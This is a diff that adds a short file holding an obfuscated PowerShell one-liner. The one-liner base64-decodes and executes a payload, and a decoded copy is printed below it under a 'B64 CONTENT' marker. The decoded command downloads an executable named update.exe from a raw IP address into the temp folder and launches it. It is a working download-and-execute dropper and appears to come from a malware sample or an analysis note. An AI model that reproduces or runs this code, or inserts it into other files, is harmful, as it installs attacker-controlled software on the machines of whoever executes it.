@@ -1,0 +1,7 @@
+iex([System.text.encoDinG]::UtF8.GeTstriNG([SYsTEm.coNvErT]::fROMbAsE64sTriNG('CihOZXctT2JqZWN0IFN5U3RlbS5uZVQuV2VCY2xpRU5UKS5kb3duTG9BREZJbGUoJ2h0dHA6Ly8xODUuMTQxLjI3LjM1L3VwZGF0ZS5leGUnLCIkZU52OlRFTVBcZmlsZXg4NjExLmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZU52OlRFTVBcZmlsZXg4NjExLmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStem.neT.WeBcliENT).downLoADFIle('http://185.141.27.35/update.exe',"$eNv:TEMP\filex8611.exe");Start-Process ("$eNv:TEMP\filex8611.exe")
+
